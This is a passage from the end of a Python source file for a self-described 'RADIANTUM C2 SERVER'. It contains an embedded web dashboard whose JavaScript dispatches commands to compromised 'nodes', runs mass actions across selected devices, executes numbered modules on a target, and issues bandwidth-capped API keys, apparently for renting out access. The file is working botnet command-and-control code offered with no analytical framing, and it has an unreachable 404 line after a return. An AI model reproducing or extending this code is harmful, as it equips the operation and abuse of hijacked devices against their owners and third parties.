            document.querySelectorAll('.node-checkbox').forEach(cb => cb.checked = master);
        }}

        async function singleAction(id, action) {{
            const res = await fetch('/api/device/control', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json', 'x-admin-token': adminToken }},
                body: JSON.stringify({{ action: action, device_id: id }})
            }});
            const data = await res.json();
            logToConsole(`ACTION [${{action}}] DISPATCHED TO ${{id}}`);
            fetchDevices();
        }}

        async function massAction(action) {{
            const selected = Array.from(document.querySelectorAll('.node-checkbox:checked')).map(cb => cb.value);
            if (selected.length === 0) {{
                logToConsole("ERROR: NO NODES SELECTED.");
                return;
            }}
            const res = await fetch('/api/device/control', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json', 'x-admin-token': adminToken }},
                body: JSON.stringify({{ action: action, device_ids: selected }})
            }});
            const data = await res.json();
            logToConsole(`MASS ACTION [${{action}}] EXECUTED ON ${{data.nodes_affected}} NODES`);
            fetchDevices();
        }}

        async function executeModule() {{
            const targetId = document.getElementById('target-id').value;
            const moduleId = document.getElementById('module-id-input').value;
            if (!targetId) {{
                logToConsole("ERROR: NO TARGET NODE SPECIFIED.");
                return;
            }}
            const res = await fetch('/api/modules/execute', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json', 'x-admin-token': adminToken }},
                body: JSON.stringify({{ device_id: targetId, module_id: parseInt(moduleId) }})
            }});
            const data = await res.json();
            logToConsole(data.message);
        }}

        async function runDiagnostic(mode) {{
            const targetId = document.getElementById('target-id').value;
            if (!targetId) {{
                logToConsole("ERROR: NO TARGET NODE SPECIFIED.");
                return;
            }}
            logToConsole(`RUNING ${{mode.toUpperCase()}} PROBE ON ${{targetId}}...`);
            const res = await fetch('/api/device/ping', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json', 'x-admin-token': adminToken }},
                body: JSON.stringify({{ device_id: targetId, mode: mode }})
            }});
            const data = await res.json();
            logToConsole(data.output.replace(/\\n/g, '<br>'));
        }}

        async function createApiKey() {{
            const duration = document.getElementById('key-duration').value;
            const cap = document.getElementById('key-cap').value;
            const res = await fetch('/api/keys/create', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json', 'x-admin-token': adminToken }},
                body: JSON.stringify({{ duration: duration, bandwidth_kbps: parseInt(cap) }})
            }});
            const data = await res.json();
            if (data.status === 'success') {{
                document.getElementById('keys-log').innerHTML += `KEY: ${{data.key.substring(0,12)}}... [${{duration}}]<br>`;
                logToConsole("NEW API TOKEN GENERATED.");
            }}
        }}

        window.onload = () => {{
            fetchDevices();
            fetchStats();
            setInterval(fetchDevices, 5000);
            setInterval(fetchStats, 10000);
        }};
    </script>
</body>
</html>"""
            _safe_send(client, _build_response(200, "OK", html_dashboard.encode(), "text/html"))
            return

            _safe_send(client, _build_response(404, "Not Found", b"404 Endpoint Not Found"))

    except Exception as e:
        print(f"[!] Request handling error: {e}")
    finally:
        try:
            client.close()
        except Exception:
            pass

class ReusableTCPServer(socketserver.TCPServer):
    allow_reuse_address = True

def run_server():
    _load_persistence()
    server = ReusableTCPServer((HOST, PORT), lambda req, client_addr, srv: handle_client(req, client_addr))
    print(f"[+] RADIANTUM C2 SERVER ACTIVE ON HTTP://{HOST}:{PORT}")
    print(f"[+] 90S RETRO DARK THEME INTERFACE LOADED.")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] SHUTTING DOWN RADIANTUM C2 DAEMON...")
        server.server_close()

if __name__ == '__main__':
    run_server()